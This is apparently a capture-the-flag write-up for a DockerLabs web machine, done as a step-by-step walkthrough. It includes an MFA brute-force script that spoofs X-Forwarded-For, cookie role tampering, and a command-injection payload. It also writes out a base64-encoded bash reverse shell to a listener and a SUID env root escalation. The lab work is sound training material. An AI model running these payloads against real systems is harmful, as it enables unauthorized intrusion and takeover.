# IP
172.17.0.2
# Reconnaissance
``` sh
ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.048 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.041 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.041/0.044/0.048/0.003 ms
```
# Ports scanning
``` sh
sudo nmap -sS -sC -sV -p- --open --min-rate 5000 -Pn 172.17.0.2
PORT     STATE SERVICE VERSION
8000/tcp open  http    Uvicorn
|_http-title: TrailPack \xE2\x80\x94 Mochilas de monta\xC3\xB1a, senderismo y viaje
|_http-server-header: uvicorn
```

Port 8000 is open and running a web service in Uvicorn.
# Web enumeration
## Dir fuzzing
```sh
gobuster dir -u http://172.17.0.2:8000/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
login                (Status: 200) [Size: 11078]
register             (Status: 200) [Size: 13322]
logout               (Status: 303) [Size: 0] [--> /]
dashboard            (Status: 307) [Size: 0] [--> /login]
accounting           (Status: 307) [Size: 0] [--> /login]
Progress: 207641 / 207641 (100.00%)
===============================================================
Finished
===============================================================
```
## MFA authentication
Fuzzing couldn't find it but there's an endpoint /verify-mfa that's requested after login in
The MFA is a 4 digit sequence
We could brute force this MFA because the rate limit is vulnerable to the header *X-Forwarded-For*
We could run a python script to automatize this

``` python
import requests, random

URL   = "http://172.17.0.2:8000"
s     = requests.Session()

r = s.post(URL + "/login", data={"dni": "12345678", "password": "12345678"})

for code in range(10000):
    guess = str(code).zfill(4)
    spoof = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

    r = s.post(URL + "/verify-mfa",
               headers={"X-Forwarded-For": spoof},
               data={"pin": guess})
    if len(r.content) != 10767:
        print(guess + " interesting")
        break
```

``` sh
python3 mfa-bypass.py
5271 interesting
```
# Dashboard
Exploring the source code there's an interesting script

``` javascript
fetch('/api/me') 
	.then(r => r.json()) 
	.then(data => { 
	
		// Actualizar nombre mostrado 
		const el = document.getElementById('display-name'); 
		if (el && data.user) el.textContent = data.user; 
		
		// Escribir rol en cookie (se propaga al backend para /accounting) 
		const payload = { user: data.user, role: data.role, email: data.email };
		document.cookie = 'user_info=' + btoa(JSON.stringify(payload)) + '; path=/; SameSite=Lax'; 
		
		// Mostrar enlace de admin solo si rol es admin (validación frontend) 
		if (data.role === 'admin') { 
			const link = document.getElementById('admin-panel-link'); 
			if (link) link.classList.replace('hidden', 'flex'); } 
		})
	.catch(() => {});
```

Exploring that request

``` sh
curl 'http://172.17.0.2:8000/api/me' \
  -b 'session_id=716ed627370c5d159a374f03cfcb77ca8b4f4345881e30f875d8c8939dce0085; user_info=eyJ1c2VyIjoidGVzdDEiLCJyb2xlIjoidXNlciIsImVtYWlsIjoidGVzdEB0ZXN0LmNvbSJ9'

{"user":"test1","role":"user","email":"test@test.com"}
```

Using the *match & replace* function in burpsuite it is possible that server doesn't validate if we change our role
# Accounting
**Accessing to /accounting**
* [x] FLAG{cl13nt_s1d3_r0l3_1s_n0_s3cur1ty}

In these page we can enumerate some users
```sh
curl 'http://172.17.0.2:8000/accounting' \
  -b 'session_id=e0a6bd7ec2337b14d359363760e634ef34ae0d514d37260eb06efd87ae1ce360; user_info=eyJ1c2VyIjoidGVzdDEiLCJyb2xlIjoiYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==' | grep @ | tr '<>' ' ' | awk '{print $6}'
  
carlos.mendoza@trailpack.es
elena.sanchez@trailpack.es
hacker@hacker.com
maria.garcia@trailpack.es
pedro.lopez@trailpack.es
test@test.com
```

![[Pasted image 20260923122022.png]]
# Complaints form
When trying some simple XSS in that form we received an error
This means this field is executing commands and doesn't understand js functions

Trying basic command injection

``` 
test; whoami
test
balutron
```

The input is *vulnerable to command injection*
# Exposed credentials
After little enumeration, when inspecting the app source code, credentials are being exposed in plain text

``` sh
cat main.py
```

``` python
# ══════════════════════════════════════════════════════════════════════════════
#  Base de datos en memoria  (4 usuarios)
# ══════════════════════════════════════════════════════════════════════════════

USERS: dict[str, dict] = {
    "71960227N": {
        "dni": "71960227N", "name": "Carlos Mendoza",
        "email": "carlos.mendoza@trailpack.es",
        "password": hash_pw("chocolate"),
        "role": "user", "balance": 42350.75,
    },
    "71968040M": {
        "dni": "71968040M", "name": "María García",
        "email": "maria.garcia@trailpack.es",
        "password": hash_pw("barcelona"),
        "role": "user", "balance": 8920.50,
    },
    "11325016T": {
        "dni": "11325016T", "name": "Pedro López",
        "email": "pedro.lopez@trailpack.es",
        "password": hash_pw("123456"),
        "role": "user", "balance": 15640.30,
    },
    "11352580X": {
        "dni": "11352580X", "name": "Elena Sánchez",
        "email": "elena.sanchez@trailpack.es",
        "password": hash_pw("password"),
        "role": "user", "balance": 31280.00,
    },
}

MFA_PINS: dict[str, str] = {
    "71960227N": "4829",
    "71968040M": "2847",
    "11325016T": "9163",
    "11352580X": "5512",
}

TARGET_DNI = "71960227N"
```
# Rev shell
Listening on the kali
``` sh
sudo nc -lvnp 443
```

The payload to get a reverse shell is
``` sh
sh -i >& /dev/tcp/172.17.0.1/443 0>&1
```

We encode this for the server to receive it ok
```sh
echo 'sh -i >& /dev/tcp/172.17.0.1/443 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDMgMD4mMQo=
```

**Payload**
```
; echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS80NDMgMD4mMQo=' | base64 -d | bash
```
# Stabilizing the shell
``` sh
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
balutron@421204dbc268:/app$ ^Z
zsh: suspended  sudo nc -lvnp 443

┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/intermediate/trailpack]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -lvnp 443
                                   export TERM=xterm SHELL=/bin/sh
balutron@421204dbc268:/app$ ^C
balutron@421204dbc268:/app$ ^C
balutron@421204dbc268:/app$ ^C
balutron@421204dbc268:/app$ ^C
balutron@421204dbc268:/app$
```
# Privilege escalation
## SUID
```sh
find / -perm -4000 2>/dev/null
```

Found 
```
/usr/bin/env
```

# Root
``` sh
/usr/bin/env /bin/sh -p
```

```sh
whoami
root
```


